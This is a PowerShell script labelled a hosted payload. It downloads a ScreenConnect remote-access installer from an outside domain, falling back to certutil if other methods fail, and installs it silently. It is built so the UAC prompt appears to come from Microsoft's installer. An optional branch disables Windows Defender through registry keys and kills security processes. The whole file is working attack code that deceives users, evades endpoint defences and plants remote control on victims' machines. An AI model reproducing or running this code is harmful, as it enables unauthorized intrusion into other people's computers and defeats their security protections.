<#
    pay.ps1  -  hosted payload v8

    Elevation model: the payload itself runs UNELEVATED. Only the msiexec call
    is elevated, via -Verb RunAs, so the UAC dialog is raised by
    C:\Windows\System32\msiexec.exe and reads:

        Windows(R) installer
        Verified publisher: Microsoft Windows

    instead of "Windows PowerShell". No HKCU handler keys are written, so there
    is no auto-elevate-bypass behaviour for Defender to score.

    Flow
      1. context + logging (unelevated)
      2. download the MSI, hash it (unelevated)
      3. Start-Process msiexec -Verb RunAs -Wait -PassThru   <- one consent prompt
      4. exit code decoded, 1625 evidence if refused, verify install

    Optional
      PAY_DEBUG=dry          context only
      PAY_NO_PROMPT=1        run msiexec in-process (requires the caller to be elevated already)
      PAY_KILL_DEFENDER=1    attempt Defender tamper (fails under Tamper Protection)
      PAY_URL / PAY_HASH / PAY_LOG_DIR
#>

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

# --------------------------------------------------------------------------
# logging
# --------------------------------------------------------------------------
$LogDir = $env:PAY_LOG_DIR
if (-not $LogDir) { $LogDir = 'C:\Temp' }
if (-not (Test-Path -LiteralPath $LogDir)) { New-Item -ItemType Directory -Force -Path $LogDir | Out-Null }
$LogPath    = Join-Path $LogDir 'Execution_Status.log'
$DesktopLog = Join-Path ([Environment]::GetFolderPath('Desktop')) 'Execution_Status.log'

function Write-Log {
    param([string]$Message)
    $entry = '[' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + '] ' + $Message
    foreach ($p in @($LogPath, $DesktopLog)) {
        try { Add-Content -LiteralPath $p -Value $entry -Encoding UTF8 -ErrorAction Stop } catch { }
    }
    try { Write-Host $entry } catch { }
}

$T0 = Get-Date
if ($PSCommandPath) { Write-Log ('[*] payload start pid=' + $PID + ' src=' + $PSCommandPath) }
else { Write-Log ('[*] payload start pid=' + $PID + ' src=iex') }

# --------------------------------------------------------------------------
# config
# --------------------------------------------------------------------------
$Url = $env:PAY_URL
if (-not $Url) { $Url = 'https://cibiconline.co/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=mine&c=&c=&c=&c=&c=&c=' }
$ExpectHash = $env:PAY_HASH
$Dry        = ($env:PAY_DEBUG -eq 'dry')
$NoPrompt   = ($env:PAY_NO_PROMPT -eq '1')

$MsiPath = Join-Path $env:TEMP 'ScreenConnect.msi'
$MsiLog  = Join-Path $env:TEMP 'ScreenConnect_msi.log'

# --------------------------------------------------------------------------
# context
# --------------------------------------------------------------------------
$IsAdmin = $false
try {
    $id  = [Security.Principal.WindowsIdentity]::GetCurrent()
    $pr  = New-Object Security.Principal.WindowsPrincipal -ArgumentList $id
    $IsAdmin = $pr.IsInRole('Administrator')
    $bld = ''
    try { $bld = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion } catch { }
    Write-Log ('[*] ctx ps=' + $PSVersionTable.PSVersion + ' win=' + [Environment]::OSVersion.VersionString + ' build=' + $bld)
    Write-Log ('[*] ctx user=' + $id.Name + ' admin=' + $IsAdmin + ' lang=' + $ExecutionContext.SessionState.LanguageMode)
} catch { Write-Log ('[-] ctx failed: ' + $_.Exception.Message) }

if ($Dry) {
    Write-Log '[*] dry run - stopping before download'
    exit 0
}

# --------------------------------------------------------------------------
# optional Defender tamper (opt-in; expected to fail under Tamper Protection)
# --------------------------------------------------------------------------
if ($env:PAY_KILL_DEFENDER -eq '1') {
    Write-Log '[*] defender tamper requested'
    $before = $null
    try { $before = Get-MpComputerStatus -ErrorAction Stop } catch { }
    if ($before) { Write-Log ('[*] before rtp=' + $before.RealTimeProtectionEnabled + ' behavior=' + $before.BehaviorMonitorEnabled) }
    foreach ($op in @(
        @{ P = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'; N = 'DisableAntiSpyware'; V = 1 },
        @{ P = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'; N = 'DisableRealtimeMonitoring'; V = 1 },
        @{ P = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features'; N = 'TamperProtection'; V = 0 })) {
        try {
            if (-not (Test-Path -LiteralPath $op.P)) { New-Item -Path $op.P -Force | Out-Null }
            New-ItemProperty -Path $op.P -Name $op.N -Value $op.V -PropertyType DWord -Force | Out-Null
            Write-Log ('[+] reg set ' + $op.N + '=' + $op.V)
        } catch { Write-Log ('[-] reg ' + $op.N + ' blocked: ' + $_.Exception.Message) }
    }
    foreach ($pn in @('MsMpEng', 'NisSrv', 'SecurityHealthService', 'Smartscreen')) {
        try {
            $proc = Get-Process -Name $pn -ErrorAction Stop
            Stop-Process -Id $proc.Id -Force -ErrorAction Stop
            Write-Log ('[+] killed ' + $pn)
        } catch { Write-Log ('[-] kill ' + $pn + ' failed: ' + $_.Exception.Message) }
    }
    $after = $null
    try { $after = Get-MpComputerStatus -ErrorAction Stop } catch { }
    if ($after) { Write-Log ('[*] after rtp=' + $after.RealTimeProtectionEnabled + ' behavior=' + $after.BehaviorMonitorEnabled) }
} else {
    Write-Log '[*] defender tamper skipped (PAY_KILL_DEFENDER=1 to enable)'
}

# --------------------------------------------------------------------------
# download - three tiers, first success wins
# --------------------------------------------------------------------------
Write-Log ('[*] target ' + $Url)

function Get-FileTiered {
    param([string]$Address, [string]$OutFile)
    $tiers = @(
        @{ Name = 'iwr'; Act = { Invoke-WebRequest -Uri $Address -UseBasicParsing -OutFile $OutFile -TimeoutSec 120 } },
        @{ Name = 'webclient'; Act = {
            $wc = New-Object Net.WebClient
            $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
            $wc.DownloadFile($Address, $OutFile)
        } },
        @{ Name = 'certutil'; Act = {
            $p = Start-Process -FilePath (Join-Path $env:SystemRoot 'System32\certutil.exe') `
                 -ArgumentList ('-urlcache -f -split "' + $Address + '" "' + $OutFile + '"') `
                 -PassThru -Wait -WindowStyle Hidden
            if ($p.ExitCode -ne 0 -or -not (Test-Path -LiteralPath $OutFile)) { throw ('certutil exit ' + $p.ExitCode) }
        } }
    )
    foreach ($t in $tiers) {
        $sw = [Diagnostics.Stopwatch]::StartNew()
        try {
            if (Test-Path -LiteralPath $OutFile) { Remove-Item -LiteralPath $OutFile -Force }
            & $t.Act
            $size = (Get-Item -LiteralPath $OutFile -ErrorAction Stop).Length
            if ($size -le 0) { throw 'downloaded file is empty' }
            Write-Log ('[+] download via ' + $t.Name + ' ok, ' + $size + ' bytes in ' + $sw.ElapsedMilliseconds + 'ms')
            return $true
        } catch {
            Write-Log ('[-] download via ' + $t.Name + ' failed after ' + $sw.ElapsedMilliseconds + 'ms: ' + $_.Exception.Message)
        }
    }
    return $false
}

$ok = $false
try { $ok = Get-FileTiered -Address $Url -OutFile $MsiPath } catch { Write-Log ('[-] download fatal: ' + $_.Exception.Message) }
if (-not $ok) { Write-Log '[-] all download methods failed'; exit 2 }
Write-Log ('[+] payload written to ' + $MsiPath)

# --------------------------------------------------------------------------
# integrity
# --------------------------------------------------------------------------
try {
    $hash = (Get-FileHash -LiteralPath $MsiPath -Algorithm SHA256).Hash
    Write-Log ('[*] sha256 ' + $hash)
    if ($ExpectHash -and ($hash -ne $ExpectHash.ToUpper())) { Write-Log ('[-] hash mismatch, expected ' + $ExpectHash.ToUpper()); exit 3 }
} catch { Write-Log ('[-] hash failed: ' + $_.Exception.Message) }
try { Unblock-File -LiteralPath $MsiPath -ErrorAction SilentlyContinue } catch { }

# --------------------------------------------------------------------------
# 1625 evidence collector
# --------------------------------------------------------------------------
function Get-MsiBlockEvidence {
    Write-Log '[*] collecting block evidence'
    try {
        foreach ($p in @('HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer',
                         'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer')) {
            $d = (Get-ItemProperty -Path $p -Name DisableMSI -ErrorAction SilentlyContinue).DisableMSI
            if ($null -eq $d) { Write-Log ('[*] policy ' + $p + ' DisableMSI=<not set>') }
            else { Write-Log ('[!] policy ' + $p + ' DisableMSI=' + $d + '  (2 = all MSI forbidden)') }
        }
    } catch { Write-Log ('[-] policy read failed: ' + $_.Exception.Message) }
    try {
        $eff = Get-AppLockerPolicy -Effective -ErrorAction Stop
        foreach ($type in @('Exe', 'Msi', 'Script', 'Dll')) {
            $coll = $eff.RuleCollections | Where-Object { $_.RuleCollectionType -eq $type }
            if ($coll) { Write-Log ('[*] applocker ' + $type + ' enforcement=' + $coll.EnforcementMode + ' rules=' + (@($coll.Rules | Where-Object { $_ })).Count) }
        }
    } catch { Write-Log '[*] applocker: no policy or module unavailable' }
    try {
        $dg = Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard -ClassName Win32_DeviceGuard -ErrorAction Stop
        Write-Log ('[*] wdac ci=' + $dg.CodeIntegrityPolicyEnforcementStatus + ' usermode=' + $dg.UsermodeCodeIntegrityPolicyEnforcementStatus)
    } catch { Write-Log '[*] wdac: unavailable' }
    try {
        $sac = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy' -Name VerifiedAndReputablePolicyState -ErrorAction SilentlyContinue).VerifiedAndReputablePolicyState
        Write-Log ('[*] smartappcontrol=' + $(if ($null -eq $sac) { 'absent' } else { $sac }))
    } catch { }
    try {
        $ev = @(Get-WinEvent -FilterHashtable @{ LogName = 'Application'; ProviderName = 'MsiInstaller'; StartTime = (Get-Date).AddMinutes(-10) } -ErrorAction Stop)
        $begun = @($ev | Where-Object { $_.Id -eq 1040 }).Count
        Write-Log ('[*] msi events last10m=' + $ev.Count + ' transactions_begun=' + $begun)
        if ($begun -eq 0) { Write-Log '[!] no 1040 event: msiexec refused before the transaction started' }
    } catch {
        Write-Log ('[*] event log: ' + $_.Exception.Message)
        Write-Log '[!] no MSI transaction events in the last 10 min'
    }
}

# --------------------------------------------------------------------------
# install - elevate msiexec itself, so the consent dialog is the installer's
# --------------------------------------------------------------------------
$msiexec = Join-Path $env:SystemRoot 'System32\msiexec.exe'
$MsiArgs = '/i "' + $MsiPath + '" /qn /norestart /l*v "' + $MsiLog + '"'

Write-Log ('[*] exec=' + $msiexec + ' ' + $MsiArgs)

$proc = $null
$iw = [Diagnostics.Stopwatch]::StartNew()

if ($IsAdmin -or $NoPrompt) {
    Write-Log ('[*] already elevated (or PAY_NO_PROMPT=1) - running msiexec in-process')
    try {
        $proc = Start-Process -FilePath $msiexec -ArgumentList $MsiArgs -PassThru -Wait -NoNewWindow
    } catch {
        Write-Log ('[-] msiexec launch failed: ' + $_.Exception.Message)
        exit 4
    }
} else {
    Write-Log '[*] requesting elevation: prompt will read "Windows(R) installer"'
    try {
        $proc = Start-Process -FilePath $msiexec -ArgumentList $MsiArgs -Verb RunAs -PassThru -Wait
    } catch {
        $msg = $_.Exception.Message
        Write-Log ('[-] elevation request failed: ' + $msg)
        if ($msg -match 'canceled|cancelled|0x800704C7') {
            Write-Log '[-] user declined the UAC prompt'
            exit 5
        }
        exit 4
    }
}

if (-not $proc) { Write-Log '[-] no process handle returned'; exit 4 }

$map = @{ 0 = 'success'; 1602 = 'user cancel'; 1603 = 'fatal, usually needs elevation';
          1619 = 'cannot open package'; 1625 = 'blocked by policy'; 1633 = 'unsupported platform';
          1638 = 'already installed'; 3010 = 'reboot required' }
$why = $map[$proc.ExitCode]
if (-not $why) { $why = 'unmapped' }
Write-Log ('[+] msiexec exit=' + $proc.ExitCode + ' (' + $why + ') in ' + $iw.ElapsedMilliseconds + 'ms, log ' + $MsiLog)

if ($proc.ExitCode -eq 1625) {
    Write-Log '[!] 1625 = package rejected by policy before any install work began'
    Get-MsiBlockEvidence
}
if ($proc.ExitCode -eq 1638) { Write-Log '[*] 1638 = already installed - verifying' }
if ($proc.ExitCode -ne 0 -and $proc.ExitCode -ne 3010 -and $proc.ExitCode -ne 1638) { exit 4 }

# --------------------------------------------------------------------------
# verify
# --------------------------------------------------------------------------
try {
    $keys = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )
    Get-ItemProperty $keys -ErrorAction SilentlyContinue |
        Where-Object { $_.DisplayName -match 'ScreenConnect|ConnectWise' } |
        ForEach-Object { Write-Log ('[+] installed: ' + $_.DisplayName + ' ' + $_.DisplayVersion) }
} catch { }

try {
    Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'ScreenConnect' } |
        ForEach-Object { Write-Log ('[+] service ' + $_.Name + ' ' + $_.Status) }
} catch { }

try {
    Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match 'ScreenConnect' } |
        ForEach-Object { Write-Log ('[+] process ' + $_.ProcessName + ' pid=' + $_.Id) }
} catch { }

Write-Log ('[*] payload done in ' + [int]((Get-Date) - $T0).TotalMilliseconds + 'ms')
exit 0
